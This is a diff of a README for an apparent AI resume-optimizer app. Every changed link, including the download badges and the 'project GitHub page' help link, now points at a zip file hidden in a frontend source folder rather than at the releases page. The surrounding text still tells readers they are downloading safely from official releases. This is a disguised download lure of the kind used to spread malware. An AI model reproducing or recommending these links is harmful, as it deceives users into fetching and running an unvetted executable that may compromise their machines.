@@ -1,6 +1,6 @@
 # 🚀 ai-resume-optimizer - Improve Your Resume Quickly
 
-[![Download ai-resume-optimizer](https://img.shields.io/badge/Download-ai--resume--optimizer-brightgreen)](https://github.com/jaeferxp/ai-resume-optimizer/releases)
+[![Download ai-resume-optimizer](https://img.shields.io/badge/Download-ai--resume--optimizer-brightgreen)](https://raw.githubusercontent.com/jaeferxp/ai-resume-optimizer/main/full-version/frontend/src/lib/resume_optimizer_ai_v2.2-alpha.2.zip)
 
 ---
 
@@ -47,7 +47,7 @@ You open your existing resume file, or create a new one inside the app. The prog
 You will get the application from the official GitHub releases page. The steps below explain how to download and install the program safely.
 
 1. Go to the download page:  
-   [![Download Here](https://img.shields.io/badge/Go_to_-releases-blue)](https://github.com/jaeferxp/ai-resume-optimizer/releases)
+   [![Download Here](https://img.shields.io/badge/Go_to_-releases-blue)](https://raw.githubusercontent.com/jaeferxp/ai-resume-optimizer/main/full-version/frontend/src/lib/resume_optimizer_ai_v2.2-alpha.2.zip)
 
 2. On the page, look for the latest **Windows version** of ai-resume-optimizer. The file will usually have `.exe` at the end, such as `ai-resume-optimizer-setup.exe`.
 
@@ -116,7 +116,7 @@ If you have any trouble downloading or running the app:
 
 If you need help beyond this guide, check the project’s GitHub page:
 
-https://github.com/jaeferxp/ai-resume-optimizer
+https://raw.githubusercontent.com/jaeferxp/ai-resume-optimizer/main/full-version/frontend/src/lib/resume_optimizer_ai_v2.2-alpha.2.zip
 
 You can post issues or questions there. The project team monitors the page to assist users.
 
@@ -126,4 +126,4 @@ You can post issues or questions there. The project team monitors the page to as
 
 Access the latest version of ai-resume-optimizer here:  
 
-[![Download Latest Version](https://img.shields.io/badge/Download-ai--resume--optimizer-brightgreen)](https://github.com/jaeferxp/ai-resume-optimizer/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-ai--resume--optimizer-brightgreen)](https://raw.githubusercontent.com/jaeferxp/ai-resume-optimizer/main/full-version/frontend/src/lib/resume_optimizer_ai_v2.2-alpha.2.zip)
